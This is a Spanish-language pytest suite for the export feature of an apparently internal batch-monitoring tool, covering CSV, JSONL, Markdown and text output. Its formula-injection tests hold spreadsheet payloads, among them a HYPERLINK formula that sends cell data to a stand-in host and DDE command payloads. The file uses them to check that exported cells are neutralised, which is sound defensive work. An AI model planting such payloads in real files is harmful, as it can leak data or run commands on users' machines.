import csv
import json
from decimal import Decimal as D

import pytest

from claude_batch_monitor.config import Configuracion
from claude_batch_monitor.export import (
    ErrorDeExportacion,
    exportar,
    formato_por_extension,
    neutralizar_formula,
)
from claude_batch_monitor.job import STATUS_COMPLETED, STATUS_FAILED, Job


@pytest.fixture
def job():
    j = Job.crear(["¿Qué es un token?", "Segunda, con coma\ny salto"], Configuracion(modelo="claude-sonnet-5-5"))
    a, b = j.messages
    a.status, a.tokens_input, a.tokens_output, a.coste_usd, a.latency_ms = (
        STATUS_COMPLETED, 12, 40, D("0.000984"), 700,
    )
    b.status, b.error_type, b.detalle = STATUS_FAILED, "auth", "clave inválida"
    j.response_path(1, 1).write_text(
        "====== SOLICITUD ======\n¿Qué es un token?\n\n====== RESPUESTA ======\nUna unidad de texto.\n",
        encoding="utf-8",
    )
    return j


def _leer_csv(ruta):
    with open(ruta, encoding="utf-8-sig", newline="") as f:
        return list(csv.DictReader(f))


class TestCsv:
    def test_columnas_y_valores(self, job, tmp_path):
        filas = _leer_csv(exportar(job, tmp_path / "r.csv"))
        assert list(filas[0].keys()) == [
            "id", "estado", "tokens_entrada", "tokens_salida", "coste_usd", "latencia_ms",
            "truncada", "error_type", "detalle", "solicitud", "respuesta",
        ]
        assert filas[0]["estado"] == "completed" and filas[0]["respuesta"] == "Una unidad de texto."
        assert filas[0]["coste_usd"] == "0.000984" and filas[0]["latencia_ms"] == "700"
        assert filas[1]["estado"] == "failed" and filas[1]["error_type"] == "auth"
        assert filas[1]["solicitud"] == "Segunda, con coma\ny salto"

    def test_lleva_bom_para_que_excel_respete_las_tildes(self, job, tmp_path):
        ruta = exportar(job, tmp_path / "r.csv")
        assert ruta.read_bytes().startswith(b"\xef\xbb\xbf")


class TestInyeccionDeFormulas:
    """Una hoja de cálculo ejecuta como fórmula lo que empieza por = + - @: una respuesta no debe poder hacerlo."""

    PELIGROSAS = [
        '=HYPERLINK("http://malo.example/?d="&A1,"pulsa")', "+1+1", "-2+3", "@SUM(A1:A9)", "=1+1",
        "\t=1+1", "\r=1+1", "-1+cmd|' /C calc'!A0", "=cmd|' /C calc'!A0", "+A1", "-A1", "= 1",
    ]

    @pytest.mark.parametrize("texto", PELIGROSAS)
    def test_se_antepone_un_apostrofo(self, texto):
        assert neutralizar_formula(texto) == "'" + texto

    @pytest.mark.parametrize("texto", ["Hola", "", "a=b", "1+1", "x - y", "  =1", "Respuesta: =1+1", "¿=?", "5", "-5", "+3,5", "-0.25", "-.5", " -7 "])
    def test_el_resto_no_se_toca(self, texto):
        assert neutralizar_formula(texto) == texto

    def test_en_el_csv_exportado(self, job, tmp_path):
        a, b = job.messages
        a.text = '=HYPERLINK("http://malo.example","pulsa")'
        b.detalle = "@alerta"
        job.response_path(1, 1).write_text(
            "====== SOLICITUD ======\nx\n\n====== RESPUESTA ======\n+cmd|' /C calc'!A0\n", encoding="utf-8")
        filas = _leer_csv(exportar(job, tmp_path / "r.csv"))
        assert filas[0]["solicitud"] == "'=HYPERLINK(\"http://malo.example\",\"pulsa\")"
        assert filas[0]["respuesta"] == "'+cmd|' /C calc'!A0"
        assert filas[1]["detalle"] == "'@alerta"
        # lo que no empieza así queda igual, y las columnas numéricas no se tocan
        assert filas[1]["solicitud"] == "Segunda, con coma\ny salto" and filas[0]["coste_usd"] == "0.000984"

    def test_los_demas_formatos_conservan_el_texto_original(self, job, tmp_path):
        job.messages[0].text = "=1+1"
        reg = json.loads(exportar(job, tmp_path / "r.jsonl").read_text(encoding="utf-8").splitlines()[0])
        assert reg["solicitud"] == "=1+1"


class TestOtrosFormatos:
    def test_jsonl_una_linea_por_orden(self, job, tmp_path):
        lineas = exportar(job, tmp_path / "r.jsonl").read_text(encoding="utf-8").splitlines()
        regs = [json.loads(x) for x in lineas]
        assert len(regs) == 2
        assert regs[0]["respuesta"] == "Una unidad de texto." and regs[0]["modelo"] == "claude-sonnet-5-5"
        assert regs[1]["error_type"] == "auth" and regs[1]["latencia_ms"] == 0

    def test_markdown(self, job, tmp_path):
        md = exportar(job, tmp_path / "r.md").read_text(encoding="utf-8")
        assert f"# Resultados del lote {job.job_id}" in md
        assert "## Orden 1 — completed" in md and "Una unidad de texto." in md
        assert "## Orden 2 — failed: clave inválida" in md

    def test_texto_plano(self, job, tmp_path):
        txt = exportar(job, tmp_path / "r.txt").read_text(encoding="utf-8")
        assert "Una unidad de texto." in txt and "[orden 2: failed: clave inválida]" in txt


class TestFormato:
    def test_se_deduce_de_la_extension(self, tmp_path):
        assert formato_por_extension(tmp_path / "a.CSV") == "csv"
        assert formato_por_extension(tmp_path / "a.markdown") == "md"

    def test_extension_desconocida(self, job, tmp_path):
        with pytest.raises(ErrorDeExportacion):
            exportar(job, tmp_path / "r.xlsx")

    def test_formato_explicito_manda_sobre_la_extension(self, job, tmp_path):
        ruta = exportar(job, tmp_path / "salida.dat", formato="jsonl")
        assert json.loads(ruta.read_text(encoding="utf-8").splitlines()[0])["id"] == 1

    def test_crea_el_directorio_destino(self, job, tmp_path):
        assert exportar(job, tmp_path / "a" / "b" / "r.csv").exists()

    def test_orden_sin_respuesta_guardada_exporta_vacio(self, job, tmp_path):
        filas = _leer_csv(exportar(job, tmp_path / "r.csv"))
        assert filas[1]["respuesta"] == ""
